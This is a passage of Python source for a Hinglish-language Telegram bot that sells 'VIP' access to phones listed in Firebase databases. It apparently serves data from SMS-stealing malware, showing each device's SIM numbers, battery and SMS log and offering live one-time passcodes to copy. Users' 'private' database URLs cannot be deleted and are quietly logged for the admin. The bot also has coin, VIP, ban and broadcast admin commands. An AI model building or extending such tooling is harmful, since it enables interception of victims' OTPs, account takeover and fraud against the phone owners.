        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, "🔑 Use <code>/recent</code> again to refresh the live OTP feed.",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        return

    if data == "check_join":
        if is_main_bot:
            not_joined = await check_membership(bot_token, ctx.bot, chat_id)
            if not_joined:
                names = ", ".join(f"@{u}" for u in not_joined)
                await safe_answer(query,
                    f"❌ Aapne abhi tak join nahi kiya:\n{names}\n\n"
                    f"Pehle channel join karein, phir 'Check Now' dabayein.",
                    show_alert=True)
                return
        users_db.setdefault(chat_id, {})["verified"] = True
        chats_registry.setdefault(bot_token, set()).add(chat_id)
        try:
            if query.message:
                await query.message.delete()
        except Exception:
            pass
        try:
            await ctx.bot.send_message(
                chat_id,
                "✅ <b>Verification Successful!</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Welcome to the bot! Ab aap saare features use kar sakte hain.\n\n"
                "Menu neeche diya gaya hai 👇",
                parse_mode="HTML",
                reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
        except Exception as e:
            tlog(f"Failed to send welcome: {e}")
        return

    if data == "cmd_status":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, await _status_payload(bot_token), reply_markup=_status_keyboard())
        return

    # ── PRIVATE OTP CALLBACKS (no delete) ──────────────────
    if data == "priv_refresh":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        text, kb = await _private_dbs_view(chat_id)
        await safe_edit(query, text, reply_markup=kb)
        return

    if data == "priv_add":
        pending_action[chat_id] = {"action": "add_private_db"}
        await safe_edit(query,
            "🔐 <b>ADD PRIVATE OTP DATABASE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Apna Firebase URL bhejein, ya ek <b>.txt</b> file upload karein "
            "jisme multiple URLs ho (har line pe ek).\n\n"
            "📛 Name auto-generate hoga URL se.\n"
            "👤 Sirf aapko dikhega — baaki users ko nahi.\n"
            "♾️ <b>Unlimited</b> DBs add kar sakte hain.\n"
            "🔒 <i>Ek baar add hone ke baad, delete nahi ho sakta.</i>\n"
            "🧠 Smart extractor: sirf valid <code>*.firebaseio.com</code> links lege.\n\n"
            "Example:\n<code>https://mydb-abc12-default-rtdb.firebaseio.com</code>\n\n"
            "❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="priv_refresh")]]))
        return

    if data.startswith("priv_open:"):
        try:
            idx = int(data[10:])
        except ValueError:
            return
        dbs = PRIVATE_DBS.get(chat_id, [])
        if not (0 <= idx < len(dbs)):
            await safe_answer(query, "DB not found.", show_alert=True); return
        pdb = dbs[idx]
        devs = PRIVATE_DEVICE_CACHE.get(pdb["url"], [])
        if not devs:
            try:
                devs = await fetch_db_data(pdb["name"], pdb["url"])
                PRIVATE_DEVICE_CACHE[pdb["url"]] = devs
                PRIVATE_DEVICE_CACHE_TS[pdb["url"]] = time.time()
            except Exception:
                devs = []
        rows = []
        for d in devs[:20]:
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = f"{icon} 📱 {' & '.join(d.numbers)}" if d.numbers else f"{icon} ⚙️ {d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        if not rows:
            rows.append([InlineKeyboardButton("😴 No devices found", callback_data="noop")])
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="priv_refresh")])
        text = (f"🔐 <b>{pdb['name']}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"📱 {len(devs)} devices\n🔗 <code>{pdb['url']}</code>")
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(rows))
        return
    # No priv_del — users cannot delete their private DBs

    if data == "admin_refresh" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
        return

    if data == "admin_add_firebase" and is_admin and is_main_bot:
        pending_action[chat_id] = {"action": "add_firebase_main"}
        await safe_edit(query,
            "🔗 <b>BULK ADD FIREBASE DATABASES</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Ek ya zyada Firebase URLs bhejein — har URL ek naye line par (ya comma/space se alag).\n\n"
            "📛 <b>Names auto-generate honge</b> URL se.\n\n"
            "📄 <b>Ya ek .txt file upload karein</b> jisme har line par ek URL ho.\n\n"
            "❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        return

    if data == "add_custom_db" and not is_main_bot and is_admin:
        pending_action[chat_id] = {"action": "add_custom_db", "clone_token": bot_token}
        await safe_edit(query,
            "🔗 <b>ADD CUSTOM FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein:\n"
            "(Example: https://your-panel-default-rtdb.firebaseio.com)\n\n❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        return

    if data == "admin_users" and is_admin:
        if not users_db:
            await safe_answer(query, "No users found.", show_alert=True)
            return
        lines = ["👥 <b>User List (Top 50)</b>\n━━━━━━━━━━━━━━━━━━\n"]
        for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
            icon = "🚫" if info.get("banned") else ("✅" if info.get("verified") else "⏳")
            lines.append(f"{i}. {icon} {user_display(info)}\n   ID: <code>{uid}</code> | OTPs: {info.get('otp_count', 0)}")
        text = "\n".join(lines)
        if len(text) > 4000: text = text[:4000] + "\n\n...[more users]"
        text += "\n\nTip: To ban someone type /ban ID"
        await safe_edit(query, text,
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
        return

    if data == "admin_broadcast" and is_admin:
        pending_action[chat_id] = {"action": "broadcast_msg"}
        await safe_edit(query,
            "📢 <b>BROADCAST MESSAGE</b>\n━━━━━━━━━━━━━━━━━━\nType the message you want to broadcast below:\n\n❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        return

    if data == "admin_gift_coins" and is_admin:
        pending_action[chat_id] = {"action": "gift_coins_all"}
        await safe_edit(query,
            "🎁 <b>GIFT COINS TO ALL USERS</b>\n━━━━━━━━━━━━━━━━━━\nKitne coins sabko send karne hain? Number type karein (Jaise: 50, 100):\n\n❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        return

    if data == "home":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            await safe_edit(query, vip_lock_text(is_main_bot),
                            reply_markup=vip_lock_markup(is_main_bot, chat_id))
            return
        devices = await get_all_devices(bot_token, chat_id)
        if not devices:
            await safe_edit(query,
                "📭 <b>No Devices Found</b>\n━━━━━━━━━━━━━━━━━━\nAbhi koi device linked nahi hai. Kuch der baad '🔄 Refresh' dabayein.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="home")],
                    [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
        await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
        return

    if data.startswith("pg:"):
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            await safe_answer(query, "👑 VIP required for Devices List.", show_alert=True)
            return
        try:
            page = int(data[3:])
        except ValueError:
            page = 0
        devices = await get_all_devices(bot_token, chat_id)
        await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
        return

    if data == "online":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            await safe_answer(query, "👑 VIP required for Devices List.", show_alert=True)
            return
        devices = await get_all_devices(bot_token, chat_id)
        online_count = sum(1 for d in devices if d.status == "online")
        await safe_edit(query,
            f"🟢 <b>ONLINE NUMBERS ({online_count})</b>\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:",
            reply_markup=online_only_keyboard(devices))
        return

    if data.startswith("cp:"):
        await safe_answer(query, f"✅ OTP: {data[3:]}", show_alert=True)
        return

    devices = await get_all_devices(bot_token, chat_id)

    if data.startswith("sel:"):
        if not is_vip(bot_token, chat_id):
            await safe_answer(query, "👑 VIP required for Devices List.", show_alert=True)
            return
        dev_id = data[4:]
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await safe_answer(query, "❌ Device not found!", show_alert=True)
            return
        user_focus.setdefault(bot_token, {})[chat_id] = dev_id
        label = device_label(device)
        status = "🟢 Online" if device.status == "online" else "🔴 Offline"
        bat = f"{bat_emoji(device.battery)} {device.battery}%"
        text = (f"📱 <b>CONNECTED TO DEVICE</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Number  : <b>{label}</b>\nStatus  : {status}\nBattery : {bat}\n"
                f"Server  : <code>{device.db_tag}</code>\n━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ You are now receiving LIVE OTPs for this number.")
        await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
        return

    if data.startswith("msgs:"):
        if not is_vip(bot_token, chat_id):
            await safe_answer(query, "👑 VIP required.", show_alert=True)
            return
        dev_id = data[5:]
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await safe_answer(query, "❌ Device not found!", show_alert=True)
            return
        user_focus.setdefault(bot_token, {})[chat_id] = dev_id
        label = device_label(device)
        smss = await get_device_sms(device)
        if not smss:
            await safe_edit(query, f"📭 <b>{label}</b>\n\nNo SMS found.",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]]))
            return
        header = (f"📩 <b>MESSAGES LOG</b>\n━━━━━━━━━━━━━━━━━━\nNumber: <b>{label}</b>\n"
                  f"Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n")
        body_parts, otp_buttons, has_otp = [], [], False
        for sms in smss:
            block, otp = format_sms_block(sms, label)
            body_parts.append(block)
            if otp:
                has_otp = True
                otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
        if has_otp:
            users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
        full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
        if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
        otp_buttons.append([InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel:{dev_id}")])
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
        return

    if data.startswith("info:"):
        if not is_vip(bot_token, chat_id):
            await safe_answer(query, "👑 VIP required.", show_alert=True)
            return
        dev_id = data[5:]
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await safe_answer(query, "❌ Device not found!", show_alert=True)
            return
        user_focus.setdefault(bot_token, {})[chat_id] = dev_id
        label = device_label(device)
        status = "🟢 Online" if device.status == "online" else "🔴 Offline"
        bat = f"{bat_emoji(device.battery)} {device.battery}%"
        text = (f"ℹ️ <b>DEVICE DETAILS</b>\n━━━━━━━━━━━━━━━━━━\nNumber  : <b>{label}</b>\nStatus  : {status}\n"
                f"Battery : {bat}\nServer  : <code>{device.db_tag}</code>\n")
        for i, num in enumerate(device.numbers, 1):
            text += f"SIM {i}   : <code>{num}</code>\n"
        if device.device_info:
            text += f"\n{device.device_info}\n"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"),
             InlineKeyboardButton("ℹ️ Back", callback_data=f"sel:{dev_id}")],
            [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")],
        ])
        await safe_edit(query, text, reply_markup=kb)
        return
# ════════════════════════════════════════════════════════════
#  ADMIN COMMAND HANDLER
# ════════════════════════════════════════════════════════════

async def _get_send_bot(is_main_bot: bool, bot_token: str, fallback_bot):
    app_to_use = _main_app if is_main_bot else CLONES.get(bot_token, {}).get("app")
    if app_to_use is not None:
        return app_to_use.bot
    return fallback_bot


async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                               text: str, chat_id: int, is_main_bot: bool) -> bool:
    parts = text.strip().split(maxsplit=2)
    cmd = parts[0].lower().split("@")[0]
    args = parts[1:] if len(parts) > 1 else []

    bot_token = ctx.bot.token
    users_db = all_users if is_main_bot else CLONES[bot_token]["users"]

    async def reply(msg, **kw):
        try:
            await update.message.reply_text(msg, **kw)
        except TelegramError as e:
            tlog(f"Admin reply failed: {e}")

    if cmd == "/help":
        help_text = (
            "🛡 <b>ADMIN COMMANDS</b>\n━━━━━━━━━━━━━━━━━━\n"
            "<b>🖥 Panels</b>\n"
            "• <code>/admin</code> — Open admin panel\n"
            "• <code>/status</code> — Live engine status\n"
            "• <code>/leaderboard</code> — Top users board\n"
            "• <code>/support</code> — Support links\n\n"
            "<b>💰 Coin Management</b>\n"
            "• <code>/all 50</code> — Give 50 coins to ALL users\n"
            "• <code>/give USER_ID 100</code> — Give coins to one user\n"
            "• <code>/take USER_ID 50</code> — Take coins from one user\n"
            "• <code>/reset USER_ID</code> — Reset user's coins to 0\n"
            "• <code>/resetall</code> — Reset ALL users' coins\n"
            "• <code>/setcoin USER_ID 500</code> — Set exact coin value\n\n"
            "<b>👑 VIP Management</b>\n"
            "• <code>/vip USER_ID 24</code> — Grant 24h VIP\n"
            "• <code>/unvip USER_ID</code> — Remove VIP\n"
            "• <code>/vipall 12</code> — Grant VIP to all users\n"
            "• <code>/vipinfo USER_ID</code> — Check VIP status\n\n"
            "<b>👥 User Management</b>\n"
            "• <code>/ban USER_ID</code> — Ban user\n"
            "• <code>/unban USER_ID</code> — Unban user\n"
            "• <code>/userinfo USER_ID</code> — Full user info\n"
            "• <code>/stats</code> — Bot statistics\n"
            "• <code>/top</code> — Top 10 users by OTPs\n\n"
            "<b>📢 Messaging</b>\n"
            "• <code>/broadcast MESSAGE</code> — Send to all users\n"
            "• <code>/msg USER_ID MESSAGE</code> — Send to one user\n\n"
            "<b>🗄 Database Management</b>\n"
            "• <code>/adddb Name https://...firebaseio.com</code> — Add one DB\n"
            "• <code>/admin</code> → ➕ Add Firebase URL(s) — bulk add\n"
            "• <code>/listdb</code> — List all databases\n"
            "• <code>/count</code> — Count devices across DBs\n"
            "• <code>/viewdb</code> — Download firebase.txt\n"
            "• <code>/deldb URL</code> — Delete any DB (public + private)\n\n"
            "<b>🤖 Clone Bot Management</b>\n"
            "• <code>/clones</code> — List all active clone bots\n"
            "• <code>/kill TOKEN</code> — Stop a clone bot\n"
        )
        await reply(help_text, parse_mode="HTML")
        return True

    if cmd == "/all":
        if not args or not args[0].isdigit():
            await reply("⚠️ Usage: <code>/all 50</code>", parse_mode="HTML")
            return True
        amount = int(args[0])
        if amount <= 0:
            await reply("⚠️ Amount 0 se zyada honi chahiye.")
            return True
        wait = await update.message.reply_text(f"⏳ {len(users_db)} users ko {amount} coins bheje ja rahe hain...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)

        async def give_one(uid):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
            try:
                async with _send_sem:
                    await send_bot.send_message(
                        uid,
                        f"🎁 <b>GIFT FROM ADMIN!</b> 🎁\n\nAapko <b>{amount} Coins</b> mil gaye hain!\n"
                        f"Naya balance: <b>{users_db[uid]['coins']}</b>", parse_mode="HTML")
                return True
            except Exception:
                return False

        results = await asyncio.gather(*(give_one(u) for u in list(users_db.keys())), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(users_db) - sent
        await wait.edit_text(
            f"✅ <b>BULK GIFT SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"💰 Coins each: {amount}\n✅ Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {len(users_db)}",
            parse_mode="HTML")
        return True

    if cmd == "/give":
        if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
            await reply("⚠️ Usage: <code>/give USER_ID AMOUNT</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await reply(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        if amount <= 0:
            await reply("⚠️ Amount > 0.")
            return True
        users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
        try:
            await send_bot.send_message(
                uid,
                f"🎁 <b>GIFT FROM ADMIN!</b> 🎁\n\nAapko <b>{amount} Coins</b> mil gaye hain!\n"
                f"Naya balance: <b>{users_db[uid]['coins']}</b>", parse_mode="HTML")
            delivered = "✅ Delivered"
        except Exception:
            delivered = "⚠️ Not delivered"
        await reply(
            f"✅ <b>COINS GIVEN</b>\n👤 <code>{uid}</code>\n💰 {amount}\n"
            f"💎 New: {users_db[uid]['coins']}\n📨 {delivered}",
            parse_mode="HTML")
        return True

    if cmd == "/take":
        if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
            await reply("⚠️ Usage: <code>/take USER_ID AMOUNT</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = max(0, old - amount)
        await reply(f"✅ <code>{uid}</code>: {old} → {users_db[uid]['coins']}", parse_mode="HTML")
        return True

    if cmd == "/reset":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/reset USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = 0
        await reply(f"✅ Reset: {old} → 0", parse_mode="HTML")
        return True

    if cmd == "/resetall":
        count = 0
        for uid in users_db:
            if users_db[uid].get("coins", 0) > 0:
                users_db[uid]["coins"] = 0
                count += 1
        await reply(f"✅ <b>ALL RESET</b>\n👥 {count} affected.", parse_mode="HTML")
        return True

    if cmd == "/setcoin":
        if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
            await reply("⚠️ Usage: <code>/setcoin USER_ID VALUE</code>", parse_mode="HTML")
            return True
        uid, val = int(args[0]), int(args[1])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        old = users_db[uid].get("coins", 0)
        users_db[uid]["coins"] = val
        await reply(f"✅ <code>{uid}</code>: {old} → {val}", parse_mode="HTML")
        return True

    if cmd == "/vip":
        if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
            await reply("⚠️ Usage: <code>/vip USER_ID HOURS</code>", parse_mode="HTML")
            return True
        uid, hours = int(args[0]), int(args[1])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        if hours <= 0:
            await reply("⚠️ Hours > 0.")
            return True
        current = users_db[uid].get("vip_until", 0.0)
        users_db[uid]["vip_until"] = max(time.time(), current) + hours * 3600
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
        try:
            await send_bot.send_message(uid,
                f"👑 <b>VIP GRANTED!</b>\n\nAdmin ne aapko <b>{hours}h VIP</b> diya hai!",
                parse_mode="HTML")
        except Exception:
            pass
        await reply(f"✅ VIP {hours}h to <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/unvip":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/unvip USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        users_db[uid]["vip_until"] = 0.0
        await reply(f"✅ VIP removed from <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/vipall":
        if not args or not args[0].isdigit():
            await reply("⚠️ Usage: <code>/vipall HOURS</code>", parse_mode="HTML")
            return True
        hours = int(args[0])
        if hours <= 0:
            await reply("⚠️ Hours > 0.")
            return True
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
        wait = await update.message.reply_text(f"⏳ Granting {hours}h VIP to all...")

        async def give_vip(uid):
            current = users_db[uid].get("vip_until", 0.0)
            users_db[uid]["vip_until"] = max(time.time(), current) + hours * 3600
            try:
                async with _send_sem:
                    await send_bot.send_message(uid,
                        f"👑 <b>VIP GIFTED!</b>\n\n<b>{hours}h VIP</b> free! 🎉",
                        parse_mode="HTML")
                return True
            except Exception:
                return False

        results = await asyncio.gather(*(give_vip(u) for u in list(users_db.keys())), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        await wait.edit_text(f"✅ VIP sent to {sent}/{len(users_db)}.", parse_mode="HTML")
        return True

    if cmd == "/vipinfo":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/vipinfo USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply("❌ User not found.")
            return True
        info = users_db[uid]
        left = info.get("vip_until", 0.0) - time.time()
        status = "❌ Not VIP" if left <= 0 else f"✅ {get_vip_time_left(bot_token, uid)}"
        await reply(
            f"👑 <b>VIP STATUS</b>\n👤 <code>{uid}</code>\n📛 {info.get('name','Unknown')}\n⏱ {status}",
            parse_mode="HTML")
        return True

    if cmd == "/ban":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/ban USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        users_db[uid]["banned"] = True
        user_focus.setdefault(bot_token, {}).pop(uid, None)
        await reply(f"✅ Banned <code>{uid}</code>.", parse_mode="HTML")
        return True

    if cmd == "/unban":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/unban USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        users_db[uid]["banned"] = False
        await reply(f"✅ Unbanned <code>{uid}</code>.", parse_mode="HTML")
        return True

    if cmd == "/userinfo":
        if not args or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/userinfo USER_ID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await reply(f"❌ User <code>{uid}</code> not found.", parse_mode="HTML")
            return True
        info = users_db[uid]
        vip_left = info.get("vip_until", 0.0) - time.time()
        vip_status = "❌ Not VIP" if vip_left <= 0 else f"✅ {get_vip_time_left(bot_token, uid)}"
        await reply(
            f"👤 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <code>{uid}</code>\n📛 {info.get('name','Unknown')}\n"
            f"🔗 @{info.get('username') or 'none'}\n📅 {info.get('joined_at','N/A')}\n"
            f"💰 Coins: {info.get('coins',0)}\n👥 Referrals: {info.get('referrals',0)}\n"
            f"📩 OTPs: {info.get('otp_count',0)}\n🤖 Bots: {info.get('bots_created',0)}\n"
            f"👑 VIP: {vip_status}\n"
            f"🔐 {'✅' if info.get('verified') else '⏳'}, {'🚫' if info.get('banned') else '✅ Active'}",
            parse_mode="HTML")
        return True

    if cmd == "/stats":
        total_users = len(users_db)
        verified = sum(1 for u in users_db.values() if u.get("verified"))
        banned = sum(1 for u in users_db.values() if u.get("banned"))
        vip_users = sum(1 for u in users_db.values() if u.get("vip_until", 0) > time.time())
        total_coins = sum(u.get("coins", 0) for u in users_db.values())
        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
        total_refs = sum(u.get("referrals", 0) for u in users_db.values())
        total_devices = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        await reply(
            f"📊 <b>BOT STATISTICS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users: {total_users}\n✅ Verified: {verified}\n🚫 Banned: {banned}\n"
            f"👑 VIPs: {vip_users}\n💰 Coins: {total_coins}\n"
            f"📩 OTPs: {total_otps}\n👥 Referrals: {total_refs}\n"
            f"📱 Devices: {total_devices}\n🗄 DBs: {len(DATABASES)}\n"
            f"🔐 Private DBs: {total_private_dbs()}\n"
            f"🤖 Clones: {len(CLONES)}\n━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}",
            parse_mode="HTML")
        return True

    if cmd == "/top":
        await reply(_leaderboard_text(users_db), parse_mode="HTML")
        return True

    if cmd == "/broadcast":
        if not args:
            await reply("⚠️ Usage: <code>/broadcast Your message</code>", parse_mode="HTML")
            return True
        msg = " ".join(args)
        targets = chats_registry.get(bot_token, set())
        if not targets:
            await reply("❌ No verified chats.")
            return True
        wait = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)} users...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)

        async def send_one(cid):
            if cid == chat_id: return False
            try:
                async with _send_sem:
                    await send_bot.send_message(cid, msg, parse_mode="HTML")
                return True
            except Exception:
                return False

        results = await asyncio.gather(*(send_one(c) for c in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
        await wait.edit_text(f"📢 <b>BROADCAST DONE</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode="HTML")
        return True

    if cmd == "/msg":
        if len(args) < 2 or not args[0].lstrip("-").isdigit():
            await reply("⚠️ Usage: <code>/msg USER_ID Your message</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        msg = " ".join(args[1:])
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
        try:
            await send_bot.send_message(uid,
                f"📨 <b>MESSAGE FROM ADMIN</b>\n\n{msg}", parse_mode="HTML")
            await reply(f"✅ Delivered to <code>{uid}</code>.", parse_mode="HTML")
        except Exception as e:
            await reply(f"❌ Failed: {e}")
        return True

    if cmd == "/adddb":
        urls = extract_firebase_urls(" ".join(args)) or extract_urls(" ".join(args))
        if len(urls) > 1:
            wait = await update.message.reply_text(f"⏳ Adding {len(urls)} databases (auto-naming)...")
            added, _ = await bulk_add_databases(urls, user_id=chat_id)
            lines = [f"✅ <b>BULK ADD COMPLETE</b>\n━━━━━━━━━━━━━━━━━━"]
            for name, cnt in added:
                lines.append(f"🗄 <b>{name}</b> — {cnt} devices")
            lines.append(f"━━━━━━━━━━━━━━━━━━\nTotal DBs: {len(DATABASES)}")
            await wait.edit_text("\n".join(lines), parse_mode="HTML")
            return True
        if len(args) < 2:
            await reply("⚠️ Usage: <code>/adddb Name https://...</code>\nBulk: paste multiple URLs at once",
                        parse_mode="HTML")
            return True
        name = args[0].strip()
        url = args[1].strip()
        if not url.startswith("http"):
            await reply("⚠️ URL must start with http.")
            return True
        if name in DATABASES:
            await reply(f"⚠️ '{name}' exists.")
            return True
        DATABASES[name] = url
        try:
            devs = await fetch_db_data(name, url)
            GLOBAL_DEVICE_CACHE[name] = devs
            GLOBAL_DEVICE_CACHE_TS[name] = time.time()
            log_firebase_url(url, chat_id, source="public")
            await reply(
                f"✅ <b>ADDED</b>\n📛 {name}\n📱 Devices: {len(devs)}\n🗄 Total: {len(DATABASES)}",
                parse_mode="HTML")
        except Exception as e:
            await reply(f"⚠️ Fetch failed: {e}")
        return True

    if cmd == "/listdb":
        lines = [f"🗄 <b>DATABASES ({len(DATABASES)})</b>", "━━━━━━━━━━━━━━━━━━"]
        for i, (name, url) in enumerate(DATABASES.items(), 1):
            dev_count = len(GLOBAL_DEVICE_CACHE.get(name, []))
            lines.append(f"{i}. <b>{name}</b> — {dev_count} devices")
        text = "\n".join(lines)
        if len(text) > 4000: text = text[:4000] + "\n...[more]"
        await reply(text, parse_mode="HTML", disable_web_page_preview=True)
        return True

    if cmd == "/count":
        total = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        online = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == "online")
        with_num = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.numbers)
        await reply(
            f"📱 <b>DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🗄 DBs: {len(DATABASES)}\n📱 Total: {total}\n"
            f"🟢 Online: {online}\n🔴 Offline: {total - online}\n"
            f"📞 With numbers: {with_num}\n⚙️ Without: {total - with_num}",
            parse_mode="HTML")
        return True

    if cmd == "/viewdb":
        if not os.path.exists(FIREBASE_LOG_FILE):
            await reply("📭 firebase.txt does not exist yet.")
            return True
        try:
            with open(FIREBASE_LOG_FILE, "rb") as f:
                await update.message.reply_document(
                    document=f, filename="firebase.txt",
                    caption="📄 <b>firebase.txt</b> — every uploaded Firebase URL\n"
                            f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}",
                    parse_mode="HTML")
        except Exception as e:
            await reply(f"❌ Failed to send file: {e}")
        return True

    if cmd == "/deldb":
        if not args:
            await reply("⚠️ Usage: <code>/deldb URL</code>", parse_mode="HTML")
            return True
        target = args[0].strip().rstrip("/")
        removed_pub = []
        for name, u in list(DATABASES.items()):
            if u.rstrip("/") == target:
                del DATABASES[name]
                GLOBAL_DEVICE_CACHE.pop(name, None)
                GLOBAL_DEVICE_CACHE_TS.pop(name, None)
                removed_pub.append(name)
        removed_priv = 0
        for uid, dbs in list(PRIVATE_DBS.items()):
            new = [p for p in dbs if p["url"] != target]
            if len(new) != len(dbs):
                removed_priv += len(dbs) - len(new)
                PRIVATE_DBS[uid] = new
                if not new:
                    PRIVATE_DBS.pop(uid, None)
        if not removed_pub and not removed_priv:
            await reply("❌ URL not found in any database (public or private).")
            return True
